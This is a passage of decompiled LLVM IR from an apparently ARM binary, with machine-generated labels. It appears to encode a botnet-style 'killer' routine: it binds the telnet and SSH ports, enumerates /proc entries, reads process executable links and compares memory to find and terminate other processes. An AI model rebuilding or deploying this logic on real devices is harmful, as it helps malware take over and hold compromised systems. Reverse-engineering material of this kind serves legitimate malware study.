  %v1_e1d0 = call i32 @function_dc00(i32 %v1_e1cc)
  %v1_e1d8 = call i32 @function_1484c(i32 23)
  store i32 %v2_e1b8, i32* %r3.global-to-local, align 4
  %v0_e1ec = load i32, i32* @r5, align 4
  store i32 %v0_e1ec, i32* %r2.global-to-local, align 4
  %v3_e1f0 = call i32 @function_14b54(i32 2, i32 1, i32 %v0_e1ec)
  %v7_e1f4 = icmp eq i32 %v3_e1f0, -1
  store i32 %v3_e1f0, i32* @r4, align 4
  br i1 %v7_e1f4, label %dec_label_pc_e21c, label %dec_label_pc_e200

dec_label_pc_e200:                                ; preds = %dec_label_pc_e1b8
  %v2_e204 = ptrtoint i32* %stack_var_-76 to i32
  store i32 16, i32* @r2, align 4
  %v3_e20c = call i32 @function_14770(i32 %v3_e1f0, i32 %v2_e204, i32 16)
  %v0_e210 = load i32, i32* @r4, align 4
  store i32 %v0_e210, i32* @r0, align 4
  %v2_e218 = call i32 @function_149a8(i32 %v0_e210, i32 1)
  br label %dec_label_pc_e21c

dec_label_pc_e21c:                                ; preds = %dec_label_pc_e1b8, %dec_label_pc_e200
  %v1_e220 = call i32 @function_1484c(i32 22)
  %v1_e224 = call i32 @function_dc00(i32 %v1_e220)
  %v1_e22c = call i32 @function_1484c(i32 22)
  %v0_e238 = load i32, i32* @r5, align 4
  store i32 %v0_e238, i32* %r2.global-to-local, align 4
  %v3_e244 = call i32 @function_14b54(i32 2, i32 1, i32 %v0_e238)
  %v7_e248 = icmp eq i32 %v3_e244, -1
  store i32 %v3_e244, i32* @r4, align 4
  br i1 %v7_e248, label %dec_label_pc_e270, label %dec_label_pc_e254

dec_label_pc_e254:                                ; preds = %dec_label_pc_e21c
  %v2_e258 = ptrtoint i32* %stack_var_-76 to i32
  store i32 16, i32* @r2, align 4
  %v3_e260 = call i32 @function_14770(i32 %v3_e244, i32 %v2_e258, i32 16)
  %v0_e264 = load i32, i32* @r4, align 4
  store i32 %v0_e264, i32* @r0, align 4
  %v2_e26c = call i32 @function_149a8(i32 %v0_e264, i32 1)
  br label %dec_label_pc_e270

dec_label_pc_e270:                                ; preds = %dec_label_pc_e21c, %dec_label_pc_e254
  %v1_e274 = call i32 @function_15c0c(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_e27c = call i32 @function_13c7c()
  store i32 ptrtoint (i32* @global_var_2234c.107 to i32), i32* %r3.global-to-local, align 4
  store i32 %v0_e27c, i32* %r2.global-to-local, align 4
  %v0_e288 = load i32, i32* @r5, align 4
  %v1_e288 = trunc i32 %v0_e288 to i8
  %v3_e288 = inttoptr i32 %v0_e27c to i8*
  store i8 %v1_e288, i8* %v3_e288, align 1
  %v0_e28c = load i32, i32* @r5, align 4
  %v1_e28c = load i32, i32* %r3.global-to-local, align 4
  %v2_e28c = inttoptr i32 %v1_e28c to i32*
  store i32 %v0_e28c, i32* %v2_e28c, align 4
  store i32 ptrtoint (i32* @global_var_22910.109 to i32), i32* %r3.global-to-local, align 4
  %v0_e298 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_e298, i32* @global_var_22910.109, align 4
  %v1_e29c = call i32 @function_11a94(i32 6)
  %v1_e2a4 = call i32 @function_11a94(i32 7)
  %v2_e2ac = ptrtoint i32* %stack_var_-4264 to i32
  %v0_e2b4 = load i32, i32* @r5, align 4
  %v2_e2bc = inttoptr i32 %v0_e2b4 to i32*
  %v3_e2bc = call i32 @function_119d0(i32 6, i32* %v2_e2bc)
  %v1_e2c4 = add i32 %v2_e2ac, -52
  store i32 %v1_e2c4, i32* %r2.global-to-local, align 4
  store i32 %v1_e2c4, i32* @r0, align 4
  %v2_e2d4 = inttoptr i32 %v1_e2c4 to i8*
  %v3_e2d4 = call i32 @function_1234c(i8* %v2_e2d4, i32 %v3_e2bc)
  store i32 %v3_e2d4, i32* @r0, align 4
  store i32 %v1_e2c4, i32* %r3.global-to-local, align 4
  %v2_e2dc = add i32 %v3_e2d4, %v1_e2c4
  store i32 %v2_e2dc, i32* @r4, align 4
  %v1_e2e0 = call i32 @function_15b74(i32 %v3_e2d4)
  %v2_e2e8 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v2_e2e8, i32* %r2.global-to-local, align 4
  %v3_e2f0 = trunc i32 %v1_e2e0 to i8
  %v4_e2f0 = call i32 @function_12824(i8 %v3_e2f0, i32 10, i32 %v2_e2e8)
  %v0_e2f8 = load i32, i32* @r4, align 4
  store i32 %v0_e2f8, i32* @r0, align 4
  %v2_e2fc = inttoptr i32 %v0_e2f8 to i8*
  %v3_e2fc = call i32 @function_1234c(i8* %v2_e2fc, i32 %v4_e2f0)
  %v0_e300 = load i32, i32* @r5, align 4
  %v1_e304 = load i32, i32* @r4, align 4
  %v2_e304 = add i32 %v1_e304, %v3_e2fc
  store i32 %v2_e304, i32* @r4, align 4
  %v2_e30c = inttoptr i32 %v0_e300 to i32*
  %v3_e30c = call i32 @function_119d0(i32 7, i32* %v2_e30c)
  %v0_e314 = load i32, i32* @r4, align 4
  store i32 %v0_e314, i32* @r0, align 4
  %v2_e318 = inttoptr i32 %v0_e314 to i8*
  %v3_e318 = call i32 @function_1234c(i8* %v2_e318, i32 %v3_e30c)
  %v0_e31c = load i32, i32* @r5, align 4
  store i32 %v3_e318, i32* @r6, align 4
  %v2_e328 = call i32 @function_130e0(i32 %v1_e2c4, i32 %v0_e31c)
  store i32 %v2_e328, i32* @r0, align 4
  %v7_e32c = icmp eq i32 %v2_e328, -1
  br i1 %v7_e32c, label %dec_label_pc_e1a8, label %dec_label_pc_e334

dec_label_pc_e334:                                ; preds = %dec_label_pc_e270
  %v1_e334 = call i32 @function_15b20(i32 %v2_e328)
  %v1_e33c = call i32 @function_119f4(i32 6)
  %v1_e344 = call i32 @function_119f4(i32 7)
  store i32 ptrtoint (i32* @global_var_22910.109 to i32), i32* %r3.global-to-local, align 4
  %v2_e350 = load i32, i32* @global_var_22910.109, align 4
  store i32 4095, i32* @r2, align 4
  store i32 %v1_e2c4, i32* @r0, align 4
  %v3_e35c = call i32 @function_15bdc(i32 %v1_e2c4, i32 %v2_e350, i32 4095)
  %v7_e360 = icmp eq i32 %v3_e35c, -1
  br i1 %v7_e360, label %.thread9, label %bb223

bb223:                                            ; preds = %dec_label_pc_e334
  %v3_e368 = load i32, i32* @global_var_22910.109, align 4
  store i32 %v3_e368, i32* %r3.global-to-local, align 4
  %v1_e36c = load i32, i32* @r5, align 4
  %v2_e36c = trunc i32 %v1_e36c to i8
  %v5_e36c = add i32 %v3_e368, %v3_e35c
  %v6_e36c = inttoptr i32 %v5_e36c to i8*
  store i8 %v2_e36c, i8* %v6_e36c, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_e334, %bb223
  store i32 %v1_e2c4, i32* %r2.global-to-local, align 4
  %v0_e374 = load i32, i32* @r6, align 4
  %v1_e374 = load i32, i32* @r4, align 4
  %v1_e2c4.neg = sub i32 52, %v2_e2ac
  %v2_e374 = add i32 %v1_e2c4.neg, %v0_e374
  %v2_e378 = add i32 %v2_e374, %v1_e374
  %v2_e380 = call i32 @function_123b8(i32 %v1_e2c4, i32 %v2_e378)
  %v0_e384 = load i32, i32* @r7, align 4
  store i32 %v0_e384, i32* @r4, align 4
  %v0_e388 = load i32, i32* @r5, align 4
  store i32 400, i32* @r5, align 4
  %v2_e494 = ptrtoint i32* %stack_var_-156 to i32
  %v2_e498 = bitcast i32* %stack_var_-156 to i8*
  %v2_e4e4 = ptrtoint i32* %stack_var_-220 to i32
  %v2_e4e8 = bitcast i32* %stack_var_-220 to i8*
  %v2_e6b4 = ptrtoint i32* %stack_var_-8412 to i32
  br label %dec_label_pc_e390

dec_label_pc_e390:                                ; preds = %dec_label_pc_e458, %.thread9
  %stack_var_-8428.0 = phi i32 [ %v0_e388, %.thread9 ], [ %stack_var_-8428.3, %dec_label_pc_e458 ]
  %v1_e394 = call i32 @function_11a94(i32 6)
  %v3_e3a0 = call i32 @function_119d0(i32 6, i32* null)
  store i32 %v3_e3a0, i32* @r0, align 4
  %v1_e3a4 = call i32 @function_12bbc(i32 %v3_e3a0)
  store i32 %v1_e3a4, i32* @r8, align 4
  %v2_e3a8 = icmp eq i32 %v1_e3a4, 0
  br i1 %v2_e3a8, label %dec_label_pc_e1a8, label %dec_label_pc_e3b0

dec_label_pc_e3b0:                                ; preds = %dec_label_pc_e390
  %v1_e3b4 = call i32 @function_119f4(i32 6)
  %v0_e3b8119 = load i32, i32* @r8, align 4
  %v1_e3bc120 = inttoptr i32 %v0_e3b8119 to i32*
  %v2_e3bc121 = call i32 @function_12c08(i32* %v1_e3bc120)
  %v2_e3c0123 = icmp eq i32 %v2_e3bc121, 0
  br i1 %v2_e3c0123, label %dec_label_pc_e458, label %dec_label_pc_e3c8.preheader

dec_label_pc_e3c8.preheader:                      ; preds = %dec_label_pc_e3b0, %dec_label_pc_e3b8.backedge
  %v0_e3c8134 = phi i32 [ %v2_e3bc, %dec_label_pc_e3b8.backedge ], [ %v2_e3bc121, %dec_label_pc_e3b0 ]
  %stack_var_-8428.1124 = phi i32 [ %stack_var_-8428.1.be, %dec_label_pc_e3b8.backedge ], [ %stack_var_-8428.0, %dec_label_pc_e3b0 ]
  br label %dec_label_pc_e3c8

dec_label_pc_e3c8:                                ; preds = %dec_label_pc_e3c8.preheader, %dec_label_pc_e440
  %v0_e3d8 = phi i32 [ %v2_e44c, %dec_label_pc_e440 ], [ %v0_e3c8134, %dec_label_pc_e3c8.preheader ]
  %stack_var_-8428.2 = phi i32 [ %v1_e3ec, %dec_label_pc_e440 ], [ %stack_var_-8428.1124, %dec_label_pc_e3c8.preheader ]
  %v1_e3c8 = add i32 %v0_e3d8, 19
  %v2_e3c8 = inttoptr i32 %v1_e3c8 to i8*
  %v3_e3c8 = load i8, i8* %v2_e3c8, align 1
  %v4_e3c8 = zext i8 %v3_e3c8 to i32
  %v1_e3cc = add nsw i32 %v4_e3c8, -48
  store i32 %v1_e3cc, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_e3cc, 9
  br i1 %tmp, label %dec_label_pc_e3b8.backedge, label %dec_label_pc_e3d8

dec_label_pc_e3d8:                                ; preds = %dec_label_pc_e3c8
  store i32 %v1_e3c8, i32* @r6, align 4
  store i32 %v1_e3c8, i32* @r0, align 4
  %v1_e3e0 = call i32 @function_14f38(i32 %v1_e3c8)
  %v0_e3e8 = load i32, i32* @r5, align 4
  %v1_e3ec = add i32 %stack_var_-8428.2, 1
  store i32 %v1_e3ec, i32* %r3.global-to-local, align 4
  store i32 %v1_e3e0, i32* @r7, align 4
  %v5_e3f8 = icmp slt i32 %v0_e3e8, %v1_e3e0
  %v2_e468 = call i32 @function_15ad0(i32* null)
  br i1 %v5_e3f8, label %dec_label_pc_e464, label %dec_label_pc_e3fc

dec_label_pc_e3fc:                                ; preds = %dec_label_pc_e3d8
  %v0_e404 = load i32, i32* @r4, align 4
  %v2_e404 = sub i32 %v2_e468, %v0_e404
  %v7_e40c = icmp slt i32 %v2_e404, 601
  br i1 %v7_e40c, label %dec_label_pc_e414, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_e3fc
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_e3b8.backedge

dec_label_pc_e414:                                ; preds = %dec_label_pc_e3fc
  %v0_e414 = load i32, i32* @r7, align 4
  %v7_e418 = icmp slt i32 %v0_e414, 401
  br i1 %v7_e418, label %dec_label_pc_e3b8.backedge, label %dec_label_pc_e41c

dec_label_pc_e41c:                                ; preds = %dec_label_pc_e414
  %v3_e424 = zext i32 %v1_e3ec to i64
  %v4_e424 = mul nuw i64 %v3_e424, 3435973837
  %v3_e4281 = udiv i64 %v4_e424, 34359738368
  %v3_e42c3 = mul nuw nsw i64 %v3_e4281, 8
  %v3_e42c = trunc i64 %v3_e42c3 to i32
  store i32 %v3_e42c, i32* %r3.global-to-local, align 4
  %v2_e4305 = mul nuw nsw i64 %v3_e4281, 2
  %v2_e430 = trunc i64 %v2_e4305 to i32
  %v2_e434 = add i32 %v3_e42c, %v2_e430
  store i32 %v2_e434, i32* %r2.global-to-local, align 4
  %v9_e438 = icmp eq i32 %v1_e3ec, %v2_e434
  br i1 %v9_e438, label %dec_label_pc_e440, label %dec_label_pc_e3b8.backedge

dec_label_pc_e440:                                ; preds = %dec_label_pc_e41c
  %v1_e444 = call i32 @function_15c0c(i32 1)
  %v0_e448 = load i32, i32* @r8, align 4
  %v1_e44c = inttoptr i32 %v0_e448 to i32*
  %v2_e44c = call i32 @function_12c08(i32* %v1_e44c)
  %v2_e450 = icmp eq i32 %v2_e44c, 0
  br i1 %v2_e450, label %dec_label_pc_e458, label %dec_label_pc_e3c8

dec_label_pc_e458:                                ; preds = %dec_label_pc_e3b8.backedge, %dec_label_pc_e440, %dec_label_pc_e3b0
  %stack_var_-8428.3 = phi i32 [ %stack_var_-8428.0, %dec_label_pc_e3b0 ], [ %v1_e3ec, %dec_label_pc_e440 ], [ %stack_var_-8428.1.be, %dec_label_pc_e3b8.backedge ]
  %v0_e458 = load i32, i32* @r8, align 4
  %v1_e45c = inttoptr i32 %v0_e458 to i32*
  %v2_e45c = call i32 @function_12b8c(i32* %v1_e45c)
  br label %dec_label_pc_e390

dec_label_pc_e464:                                ; preds = %dec_label_pc_e3d8
  %v1_e474 = call i32 @function_11a94(i32 6)
  %v1_e47c = call i32 @function_11a94(i32 7)
  %v3_e488 = call i32 @function_119d0(i32 6, i32* null)
  store i32 %v2_e494, i32* @r0, align 4
  %v3_e498 = call i32 @function_1234c(i8* %v2_e498, i32 %v3_e488)
  store i32 %v2_e494, i32* %r2.global-to-local, align 4
  %v2_e4a4 = add i32 %v3_e498, %v2_e494
  %v0_e4a8 = load i32, i32* @r6, align 4
  store i32 %v2_e4a4, i32* @r0, align 4
  %v2_e4b0 = inttoptr i32 %v2_e4a4 to i8*
  %v3_e4b0 = call i32 @function_1234c(i8* %v2_e4b0, i32 %v0_e4a8)
  %v3_e4c0 = call i32 @function_119d0(i32 7, i32* null)
  %v2_e4c8 = add i32 %v2_e4a4, %v3_e4b0
  store i32 %v2_e4c8, i32* @r0, align 4
  %v2_e4cc = inttoptr i32 %v2_e4c8 to i8*
  %v3_e4cc = call i32 @function_1234c(i8* %v2_e4cc, i32 %v3_e4c0)
  %v3_e4d8 = call i32 @function_119d0(i32 6, i32* null)
  store i32 %v2_e4e4, i32* @r0, align 4
  %v3_e4e8 = call i32 @function_1234c(i8* %v2_e4e8, i32 %v3_e4d8)
  store i32 %v2_e4e4, i32* %r3.global-to-local, align 4
  %v2_e4f4 = add i32 %v3_e4e8, %v2_e4e4
  store i32 %v2_e4f4, i32* @r5, align 4
  %v0_e4f8 = load i32, i32* @r6, align 4
  store i32 %v2_e4f4, i32* @r0, align 4
  %v2_e500 = inttoptr i32 %v2_e4f4 to i8*
  %v3_e500 = call i32 @function_1234c(i8* %v2_e500, i32 %v0_e4f8)
  store i32 %v3_e500, i32* @r4, align 4
  %v3_e510 = call i32 @function_119d0(i32 11, i32* null)
  %v0_e518 = load i32, i32* @r4, align 4
  %v1_e518 = load i32, i32* @r5, align 4
  %v2_e518 = add i32 %v1_e518, %v0_e518
  store i32 %v2_e518, i32* @r0, align 4
  %v2_e51c = inttoptr i32 %v2_e518 to i8*
  %v3_e51c = call i32 @function_1234c(i8* %v2_e51c, i32 %v3_e510)
  %v1_e524 = call i32 @function_119f4(i32 6)
  %v1_e52c = call i32 @function_119f4(i32 7)
  store i32 %v2_e494, i32* @r0, align 4
  store i32 4095, i32* @r2, align 4
  %v3_e544 = call i32 @function_15bdc(i32 %v2_e494, i32 %v1_e2c4, i32 4095)
  %v7_e548 = icmp eq i32 %v3_e544, -1
  store i32 %v3_e544, i32* @r5, align 4
  br i1 %v7_e548, label %dec_label_pc_e60c, label %dec_label_pc_e554

dec_label_pc_e554:                                ; preds = %dec_label_pc_e464
  store i32 0, i32* @r4, align 4
  %v4_e560 = add i32 %v3_e544, %v1_e2c4
  %v5_e560 = inttoptr i32 %v4_e560 to i8*
  store i8 0, i8* %v5_e560, align 1
  %v1_e564 = call i32 @function_11a94(i32 10)
  %v0_e568 = load i32, i32* @r4, align 4
  %v2_e570 = inttoptr i32 %v0_e568 to i32*
  %v3_e570 = call i32 @function_119d0(i32 10, i32* %v2_e570)
  %v0_e574 = load i32, i32* @r5, align 4
  %v1_e574 = add i32 %v0_e574, -1
  store i32 %v1_e574, i32* @r1, align 4
  store i32 %v3_e570, i32* %r2.global-to-local, align 4
  %v4_e580 = call i32 @function_12680(i8* %v2_e2d4, i32 %v1_e574, i32 %v3_e570)
  %v7_e584 = icmp eq i32 %v4_e580, -1
  br i1 %v7_e584, label %dec_label_pc_e5a0, label %dec_label_pc_e58c

dec_label_pc_e58c:                                ; preds = %dec_label_pc_e554
  store i32 %v1_e2c4, i32* @r0, align 4
  %v1_e590 = call i32 @function_15c40(i32 %v1_e2c4)
  %v0_e594 = load i32, i32* @r7, align 4
  store i32 %v0_e594, i32* @r0, align 4
  %v2_e59c = call i32 @function_14dd8(i32 %v0_e594, i32 9)
  br label %dec_label_pc_e5a0

dec_label_pc_e5a0:                                ; preds = %dec_label_pc_e554, %dec_label_pc_e58c
  %v1_e5a4 = call i32 @function_119f4(i32 10)
  store i32 %v1_e5a4, i32* @r0, align 4
  %v1_e5a8 = call i32 @function_15b74(i32 %v1_e5a4)
  store i32 %v1_e5a8, i32* @r0, align 4
  %v0_e5ac = load i32, i32* @r7, align 4
  %v9_e5ac = icmp eq i32 %v0_e5ac, %v1_e5a8
  br i1 %v9_e5ac, label %dec_label_pc_e5d8, label %dec_label_pc_e5b4

dec_label_pc_e5b4:                                ; preds = %dec_label_pc_e5a0
  %v0_e5b4 = call i32 @function_15b88()
  %v0_e5b8 = load i32, i32* @r7, align 4
  %v9_e5b8 = icmp eq i32 %v0_e5b8, %v0_e5b4
  br i1 %v9_e5b8, label %dec_label_pc_e5d8, label %dec_label_pc_e5c0

dec_label_pc_e5c0:                                ; preds = %dec_label_pc_e5b4
  store i32 ptrtoint (i32* @global_var_22910.109 to i32), i32* %r2.global-to-local, align 4
  %v2_e5c8 = load i32, i32* @global_var_22910.109, align 4
  %v3_e5cc = call i32 @function_12710(i8* %v2_e2d4, i32 %v2_e5c8)
  %v2_e5d0 = icmp eq i32 %v3_e5cc, 0
  br i1 %v2_e5d0, label %dec_label_pc_e5e4, label %dec_label_pc_e5c0.dec_label_pc_e5d8_crit_edge

dec_label_pc_e5c0.dec_label_pc_e5d8_crit_edge:    ; preds = %dec_label_pc_e5c0
  %v0_e5dc.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_e5d8

dec_label_pc_e5d8:                                ; preds = %dec_label_pc_e5c0.dec_label_pc_e5d8_crit_edge, %dec_label_pc_e5b4, %dec_label_pc_e5a0
  %v0_e5dc = phi i32 [ %v0_e5dc.pre, %dec_label_pc_e5c0.dec_label_pc_e5d8_crit_edge ], [ %v0_e5b4, %dec_label_pc_e5b4 ], [ %v1_e5a8, %dec_label_pc_e5a0 ]
  store i32 %v2_e468, i32* @r4, align 4
  store i32 %v0_e5dc, i32* @r5, align 4
  br label %dec_label_pc_e3b8.backedge

dec_label_pc_e3b8.backedge:                       ; preds = %dec_label_pc_e41c, %dec_label_pc_e414, %dec_label_pc_e3c8, %dec_label_pc_e5d8, %dec_label_pc_e898, %.thread10
  %stack_var_-8428.1.be = phi i32 [ %v1_e3ec, %dec_label_pc_e898 ], [ %v1_e3ec, %dec_label_pc_e5d8 ], [ %v1_e3ec, %.thread10 ], [ %stack_var_-8428.2, %dec_label_pc_e3c8 ], [ %v1_e3ec, %dec_label_pc_e414 ], [ %v1_e3ec, %dec_label_pc_e41c ]
  %v0_e3b8 = load i32, i32* @r8, align 4
  %v1_e3bc = inttoptr i32 %v0_e3b8 to i32*
  %v2_e3bc = call i32 @function_12c08(i32* %v1_e3bc)
  %v2_e3c0 = icmp eq i32 %v2_e3bc, 0
  br i1 %v2_e3c0, label %dec_label_pc_e458, label %dec_label_pc_e3c8.preheader

dec_label_pc_e5e4:                                ; preds = %dec_label_pc_e5c0
  %v2_e5ec = call i32 @function_130e0(i32 %v1_e2c4, i32 0)
  %v7_e5f0 = icmp eq i32 %v2_e5ec, -1
  store i32 %v2_e5ec, i32* @r4, align 4
  br i1 %v7_e5f0, label %bb224, label %.thread12

bb224:                                            ; preds = %dec_label_pc_e5e4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_e5e4, %bb224
  store i32 ptrtoint (i32* @global_var_e604.112 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_e5f0, i32 ptrtoint (i32* @global_var_14dd8.111 to i32))
  %v0_e604 = load i32, i32* @r4, align 4
  store i32 %v0_e604, i32* @r0, align 4
  %v1_e608 = call i32 @function_15b20(i32 %v0_e604)
  br label %dec_label_pc_e60c

dec_label_pc_e60c:                                ; preds = %dec_label_pc_e464, %.thread12
  %v2_e618 = call i32 @function_130e0(i32 %v2_e494, i32 0)
  %v7_e61c = icmp eq i32 %v2_e618, -1
  br i1 %v7_e61c, label %dec_label_pc_e898, label %dec_label_pc_e628

dec_label_pc_e628:                                ; preds = %dec_label_pc_e60c
  %v1_e62c = call i32 @function_11a94(i32 12)
  %v1_e634 = call i32 @function_11a94(i32 13)
  %v1_e63c = call i32 @function_11a94(i32 14)
  %v1_e644 = call i32 @function_11a94(i32 15)
  %v1_e64c = call i32 @function_11a94(i32 16)
  %v3_e65c = call i32 @function_119d0(i32 12, i32* nonnull %stack_var_-44)
  store i32 %v3_e65c, i32* @r6, align 4
  %v3_e670 = call i32 @function_119d0(i32 13, i32* nonnull %stack_var_-48)
  store i32 %v3_e670, i32* @sl, align 4
  %v3_e684 = call i32 @function_119d0(i32 14, i32* nonnull %stack_var_-52)
  store i32 %v3_e684, i32* @sb, align 4
  %v3_e694 = call i32 @function_119d0(i32 15, i32* nonnull %stack_var_-56)
  store i32 %v3_e694, i32* @fp, align 4
  %v3_e6a8 = call i32 @function_119d0(i32 16, i32* nonnull %stack_var_-60)
  store i32 %v2_e6b4, i32* @r4, align 4
  store i32 4096, i32* %r2.global-to-local, align 4
  %v3_e6c4116 = call i32 @function_15b9c(i32 %v2_e618, i32 %v2_e6b4, i32 4096)
  %tmp225 = icmp slt i32 %v3_e6c4116, 1
  br i1 %tmp225, label %dec_label_pc_e8cc, label %dec_label_pc_e6d0

dec_label_pc_e6d0:                                ; preds = %dec_label_pc_e628, %dec_label_pc_e6b8.backedge
  %v0_e758107 = phi i32 [ %v3_e6c4, %dec_label_pc_e6b8.backedge ], [ %v3_e6c4116, %dec_label_pc_e628 ]
  store i32 %v2_e1b8, i32* %r3.global-to-local, align 4
  %v3_e6d4 = load i32, i32* %stack_var_-44, align 4
  %v5_e6dc = icmp slt i32 %v0_e758107, %v3_e6d4
  br i1 %v5_e6dc, label %dec_label_pc_e6ec, label %dec_label_pc_e798.lr.ph

dec_label_pc_e798.lr.ph:                          ; preds = %dec_label_pc_e6d0
  %v0_e798.pre = load i32, i32* @r6, align 4
  %v1_e79c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e798

dec_label_pc_e6ec:                                ; preds = %dec_label_pc_e790.backedge, %dec_label_pc_e6d0
  %v3_e6f0 = load i32, i32* %stack_var_-48, align 4
  %v5_e6f8 = icmp slt i32 %v0_e758107, %v3_e6f0
  br i1 %v5_e6f8, label %dec_label_pc_e708, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_e6ec
  %v2_e7c482 = icmp eq i32 %v0_e758107, 0
  br i1 %v2_e7c482, label %dec_label_pc_e708, label %dec_label_pc_e7cc.lr.ph

dec_label_pc_e7cc.lr.ph:                          ; preds = %.thread28
  %v0_e7cc.pre = load i32, i32* @sl, align 4
  %v1_e7d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e7cc

dec_label_pc_e708:                                ; preds = %dec_label_pc_e7c4.backedge, %.thread28, %dec_label_pc_e6ec
  store i32 %v2_e1b8, i32* %r2.global-to-local, align 4
  %v3_e70c = load i32, i32* %stack_var_-52, align 4
  %v5_e714 = icmp slt i32 %v0_e758107, %v3_e70c
  br i1 %v5_e714, label %dec_label_pc_e724, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_e708
  %v2_e7f891 = icmp eq i32 %v0_e758107, 0
  br i1 %v2_e7f891, label %dec_label_pc_e724, label %dec_label_pc_e800.lr.ph

dec_label_pc_e800.lr.ph:                          ; preds = %.thread37
  %v0_e800.pre = load i32, i32* @sb, align 4
  %v1_e804.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e800

dec_label_pc_e724:                                ; preds = %dec_label_pc_e7f8.backedge, %.thread37, %dec_label_pc_e708
  store i32 %v2_e1b8, i32* %r3.global-to-local, align 4
  %v3_e728 = load i32, i32* %stack_var_-56, align 4
  %v5_e730 = icmp slt i32 %v0_e758107, %v3_e728
  br i1 %v5_e730, label %dec_label_pc_e740, label %.thread46

.thread46:                                        ; preds = %dec_label_pc_e724
  %v2_e82c100 = icmp eq i32 %v0_e758107, 0
  br i1 %v2_e82c100, label %dec_label_pc_e740, label %dec_label_pc_e834.lr.ph

dec_label_pc_e834.lr.ph:                          ; preds = %.thread46
  %v0_e834.pre = load i32, i32* @fp, align 4
  %v1_e838.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e834

dec_label_pc_e740:                                ; preds = %dec_label_pc_e82c.backedge, %.thread46, %dec_label_pc_e724
  %v3_e744 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_e744, i32* @lr, align 4
  %v5_e74c = icmp slt i32 %v0_e758107, %v3_e744
  br i1 %v5_e74c, label %dec_label_pc_e6b8.backedge, label %.thread52

dec_label_pc_e6b8.backedge:                       ; preds = %dec_label_pc_e778, %.thread52, %dec_label_pc_e740
  store i32 4096, i32* %r2.global-to-local, align 4
  %v3_e6c4 = call i32 @function_15b9c(i32 %v2_e618, i32 %v2_e6b4, i32 4096)
  %tmp226 = icmp slt i32 %v3_e6c4, 1
  br i1 %tmp226, label %dec_label_pc_e8cc, label %dec_label_pc_e6d0

.thread52:                                        ; preds = %dec_label_pc_e740
  %v2_e758109 = icmp eq i32 %v0_e758107, 0
  br i1 %v2_e758109, label %dec_label_pc_e6b8.backedge, label %dec_label_pc_e760.lr.ph

dec_label_pc_e760.lr.ph:                          ; preds = %.thread52
  %v1_e768.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e760

dec_label_pc_e760:                                ; preds = %dec_label_pc_e778, %dec_label_pc_e760.lr.ph
  %v0_e758.in = phi i32 [ %v0_e758107, %dec_label_pc_e760.lr.ph ], [ %v0_e758, %dec_label_pc_e778 ]
  %v0_e778 = phi i32 [ 0, %dec_label_pc_e760.lr.ph ], [ %v1_e778, %dec_label_pc_e778 ]
  %v1_e764 = phi i32 [ 0, %dec_label_pc_e760.lr.ph ], [ %v1_e764174, %dec_label_pc_e778 ]
  %v0_e758 = add i32 %v0_e758.in, -1
  store i32 %v3_e6a8, i32* %r3.global-to-local, align 4
  %v2_e764 = add i32 %v1_e764, %v3_e6a8
  %v3_e764 = inttoptr i32 %v2_e764 to i8*
  %v4_e764 = load i8, i8* %v3_e764, align 1
  %v6_e764 = zext i8 %v4_e764 to i32
  store i32 %v6_e764, i32* %r2.global-to-local, align 4
  %v2_e768 = add i32 %v0_e778, %v1_e768.pre
  %v3_e768 = inttoptr i32 %v2_e768 to i8*
  %v4_e768 = load i8, i8* %v3_e768, align 1
  %v6_e768 = zext i8 %v4_e768 to i32
  store i32 %v6_e768, i32* %r3.global-to-local, align 4
  %v9_e76c = icmp eq i8 %v4_e768, %v4_e764
  br i1 %v9_e76c, label %dec_label_pc_e850, label %bb227

bb227:                                            ; preds = %dec_label_pc_e760
  br label %dec_label_pc_e778

dec_label_pc_e778:                                ; preds = %bb227, %dec_label_pc_e850
  %v1_e764174 = phi i32 [ %v1_e850, %dec_label_pc_e850 ], [ 0, %bb227 ]
  %v1_e778 = add i32 %v0_e778, 1
  %v2_e758 = icmp eq i32 %v0_e758, 0
  br i1 %v2_e758, label %dec_label_pc_e6b8.backedge, label %dec_label_pc_e760

dec_label_pc_e780:                                ; preds = %dec_label_pc_e798
  %v1_e780 = add i32 %v1_e798, 1
  store i32 %v1_e780, i32* @lr, align 4
  %v9_e784 = icmp eq i32 %v3_e6d4, %v1_e780
  br i1 %v9_e784, label %dec_label_pc_e85c, label %dec_label_pc_e790.backedge

dec_label_pc_e790.backedge:                       ; preds = %dec_label_pc_e780, %dec_label_pc_e7ac
  %v1_e798139 = phi i32 [ 0, %dec_label_pc_e7ac ], [ %v1_e780, %dec_label_pc_e780 ]
  %storemerge127 = add i32 %storemerge127.in, 1
  %v2_e790 = icmp eq i32 %v0_e790, 0
  br i1 %v2_e790, label %dec_label_pc_e6ec, label %dec_label_pc_e798

dec_label_pc_e798:                                ; preds = %dec_label_pc_e790.backedge, %dec_label_pc_e798.lr.ph
  %v0_e790.in = phi i32 [ %v0_e758107, %dec_label_pc_e798.lr.ph ], [ %v0_e790, %dec_label_pc_e790.backedge ]
  %storemerge127.in = phi i32 [ 0, %dec_label_pc_e798.lr.ph ], [ %storemerge127, %dec_label_pc_e790.backedge ]
  %v1_e798 = phi i32 [ 0, %dec_label_pc_e798.lr.ph ], [ %v1_e798139, %dec_label_pc_e790.backedge ]
  %v0_e790 = add i32 %v0_e790.in, -1
  %v2_e798 = add i32 %v1_e798, %v0_e798.pre
  %v3_e798 = inttoptr i32 %v2_e798 to i8*
  %v4_e798 = load i8, i8* %v3_e798, align 1
  %v6_e798 = zext i8 %v4_e798 to i32
  store i32 %v6_e798, i32* %r2.global-to-local, align 4
